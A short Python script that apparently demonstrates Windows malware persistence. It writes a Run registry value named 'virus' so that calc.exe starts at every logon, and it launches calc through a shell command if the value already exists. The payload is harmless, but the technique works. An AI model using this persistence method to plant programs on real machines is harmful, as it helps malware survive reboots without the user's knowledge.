import subprocess as s
import winreg

REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"

def set_reg(name, value):
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
        return True
    except WindowsError:
        return False

def get_reg(name):
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_READ)
        value, regtype = winreg.QueryValueEx(registry_key, name)
        winreg.CloseKey(registry_key)
        return value
    except WindowsError:
        return None

if (get_reg("virus")):
    print('Already done')
    payload = "Start Calc.exe"
    cmd = s.Popen(payload, shell=True, stdout=s.PIPE, stderr=s.PIPE)
else:
    print('Setting value')
    set_reg("virus", "C:\Windows\System32\calc.exe")
